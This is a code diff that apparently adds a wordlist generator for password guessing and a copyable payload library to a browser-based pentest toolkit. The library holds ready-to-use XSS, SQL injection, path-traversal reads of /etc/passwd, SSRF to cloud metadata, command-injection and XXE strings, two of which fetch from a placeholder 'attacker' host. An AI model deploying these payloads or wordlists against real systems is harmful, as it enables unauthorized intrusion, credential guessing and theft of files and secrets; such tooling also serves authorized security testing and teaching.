@@ -1170,6 +1170,121 @@ Impl["subdomain-enum"] = (root) => {
     UIKit.panel("Resolved hosts", null, o.node));
 };
 
+/* ===================== PASSWORD / WORDLIST BUILDER ===================== */
+const LEET = { a: "4", e: "3", i: "1", o: "0", s: "5", t: "7", b: "8", g: "9" };
+function buildWordlist(words, rules) {
+  const out = new Set(); const CAP = 80000;
+  const add = w => { if (w && out.size < CAP) out.add(w); };
+  for (let base of words) {
+    base = base.trim(); if (!base) continue;
+    const variants = new Set([base]);
+    if (rules.case) { variants.add(base.toLowerCase()); variants.add(base.toUpperCase()); variants.add(base.charAt(0).toUpperCase() + base.slice(1).toLowerCase()); }
+    if (rules.leet) for (const v of [...variants]) variants.add(v.replace(/[aeiostbg]/gi, c => LEET[c.toLowerCase()] || c));
+    if (rules.reverse) for (const v of [...variants]) variants.add(v.split("").reverse().join(""));
+    for (const v of variants) {
+      add(v);
+      if (rules.numbers) for (let i = 0; i <= 99; i++) add(v + i);
+      if (rules.years) for (let y = 1990; y <= 2026; y++) add(v + y);
+      if (rules.symbols) for (const s of ["!", "@", "#", "$", "!@#", "123", "1234"]) { add(v + s); add(s + v); }
+      if (out.size >= CAP) break;
+    }
+    if (out.size >= CAP) break;
+  }
+  return [...out];
+}
+Impl["password-gen"] = (root) => {
+  const base = UIKit.area("Base words / keywords", { value: "admin\ncompany\nsummer\npassword" });
+  const ruleDefs = [["case", "Case variants"], ["leet", "Leetspeak"], ["numbers", "Append 0-99"], ["years", "Append 1990-2026"], ["symbols", "Symbols"], ["reverse", "Reversed"]];
+  const checks = {};
+  const ruleRow = el("div", { class: "chips" }, ...ruleDefs.map(([k, lbl]) => {
+    const c = el("div", { class: "chip" + (["case", "numbers", "years"].includes(k) ? " on" : "") }, lbl);
+    checks[k] = ["case", "numbers", "years"].includes(k);
+    c.addEventListener("click", () => { checks[k] = !checks[k]; c.classList.toggle("on"); });
+    return c;
+  }));
+  const o = UIKit.out();
+  const nameF = UIKit.field("Save as", { placeholder: "my-wordlist" });
+  const savedWrap = el("div", {});
+  let generated = [];
+  const gen = () => {
+    const words = base.input.value.split("\n");
+    generated = buildWordlist(words, checks);
+    o.set(generated.slice(0, 500).join("\n") + (generated.length > 500 ? "\n… (" + (generated.length - 500) + " more)" : ""));
+    Toast.show(generated.length.toLocaleString() + " candidates");
+  };
+  const save = async () => {
+    if (!generated.length) return Toast.show("Generate first", "err");
+    const name = (nameF.input.value.trim() || "wordlist-" + Date.now());
+    await DB.set("wordlists", name, { name, words: generated, ts: Date.now() });
+    Toast.show("Saved " + name); refresh();
+  };
+  const download = () => {
+    if (!generated.length) return Toast.show("Generate first", "err");
+    const blob = new Blob([generated.join("\n")], { type: "text/plain" });
+    const a = el("a", { href: URL.createObjectURL(blob), download: (nameF.input.value.trim() || "wordlist") + ".txt" });
+    document.body.appendChild(a); a.click(); a.remove();
+  };
+  async function refresh() {
+    const all = (await DB.all("wordlists").catch(() => [])) || [];
+    savedWrap.innerHTML = "";
+    if (!all.length) { savedWrap.appendChild(el("div", { class: "hint" }, "no saved wordlists yet")); return; }
+    all.sort((a, b) => b.ts - a.ts).forEach(w => {
+      savedWrap.appendChild(el("div", { class: "list-row" },
+        el("div", { class: "lr-main" }, el("div", { class: "lr-title" }, w.name), el("div", { class: "lr-sub" }, w.words.length.toLocaleString() + " entries · " + new Date(w.ts).toLocaleString())),
+        UIKit.btn("Load", () => { generated = w.words; base.input.value = w.words.slice(0, 200).join("\n"); o.set(w.words.slice(0, 500).join("\n")); nameF.input.value = w.name; }),
+        UIKit.btn("Del", async () => { await DB.del("wordlists", w.name); refresh(); }, "ghost")));
+    });
+  }
+  refresh();
+  root.append(
+    UIKit.panel("Generator", null, base.wrap, el("div", { class: "fld" }, el("label", {}, "Mutation rules"), ruleRow),
+      el("div", { class: "row" }, UIKit.btn("Generate", gen, "primary"), nameF.wrap, UIKit.btn("Save", save), UIKit.btn("Download .txt", download, "ghost"))),
+    UIKit.panel("Preview", null, o.node),
+    UIKit.panel("Saved wordlists", null, savedWrap));
+};
+
+/* ===================== PAYLOAD LIBRARY ===================== */
+const PAYLOADS = {
+  XSS: ["<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "\"><script>alert(1)<\/script>", "javascript:alert(1)", "<body onload=alert(1)>", "'\"><img src=x onerror=alert(document.domain)>", "<iframe src=javascript:alert(1)>", "<details open ontoggle=alert(1)>"],
+  SQLi: ["' OR '1'='1", "' OR 1=1-- -", "admin'-- -", "' UNION SELECT NULL-- -", "1' ORDER BY 1-- -", "'; WAITFOR DELAY '0:0:5'-- -", "' AND SLEEP(5)-- -", "1) OR (1=1"],
+  LFI: ["../../../../etc/passwd", "..%2f..%2f..%2fetc%2fpasswd", "/etc/passwd%00", "php://filter/convert.base64-encode/resource=index.php", "....//....//etc/passwd", "/proc/self/environ", "C:\\Windows\\win.ini"],
+  SSRF: ["http://169.254.169.254/latest/meta-data/", "http://localhost:80", "http://127.0.0.1:22", "http://[::1]/", "file:///etc/passwd", "gopher://127.0.0.1:6379/_", "http://0.0.0.0:8080"],
+  CMDi: ["; id", "| id", "`id`", "$(id)", "& whoami", "; cat /etc/passwd", "|| ping -c1 127.0.0.1", "%0a id"],
+  XXE: ["<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///etc/passwd\">]><r>&x;</r>", "<!ENTITY xxe SYSTEM \"http://attacker/x\">", "<!DOCTYPE r [<!ENTITY % p SYSTEM \"http://attacker/e.dtd\">%p;]>"],
+};
+Impl["payload-library"] = (root) => {
+  const cats = Object.keys(PAYLOADS);
+  let active = "XSS"; let custom = {};
+  const search = UIKit.field("Filter", { placeholder: "search payloads…" });
+  const list = el("div", {});
+  const catRow = el("div", { class: "chips" });
+  const newP = UIKit.field("Add custom payload to " + active, { placeholder: "your payload", mono: true });
+  function render() {
+    list.innerHTML = "";
+    const q = search.input.value.toLowerCase();
+    const items = [...(PAYLOADS[active] || []), ...((custom[active]) || [])].filter(p => p.toLowerCase().includes(q));
+    if (!items.length) { list.appendChild(el("div", { class: "hint" }, "no matches")); return; }
+    items.forEach(p => list.appendChild(el("div", { class: "list-row" },
+      el("code", { class: "lr-main", style: "white-space:pre-wrap;word-break:break-all" }, p),
+      UIKit.copyBtn(p))));
+  }
+  function buildCats() {
+    catRow.innerHTML = "";
+    cats.forEach(c => { const chip = el("div", { class: "chip" + (c === active ? " on" : ""), onclick: () => { active = c; buildCats(); newP.input.parentElement.querySelector("label").textContent = "Add custom payload to " + active; render(); } }, c + " (" + ((PAYLOADS[c] || []).length + ((custom[c] || []).length)) + ")"); catRow.appendChild(chip); });
+  }
+  const addCustom = async () => {
+    const v = newP.input.value.trim(); if (!v) return;
+    (custom[active] = custom[active] || []).push(v); newP.input.value = "";
+    await DB.set("toolstate", "payloads-custom", custom); buildCats(); render(); Toast.show("Added");
+  };
+  (async () => { custom = (await DB.get("toolstate", "payloads-custom").catch(() => null)) || {}; buildCats(); render(); })();
+  search.input.addEventListener("input", render);
+  root.append(
+    UIKit.panel("Categories", null, catRow, search.wrap),
+    UIKit.panel("Payloads", null, list),
+    UIKit.panel("Add custom", null, el("div", { class: "row" }, newP.wrap, UIKit.btn("Add", addCustom))));
+};
+
 /* --------------------------------------------------------------------- *
  *  Shared tool-view renderer (used by desktop main + reused content)
  * --------------------------------------------------------------------- */
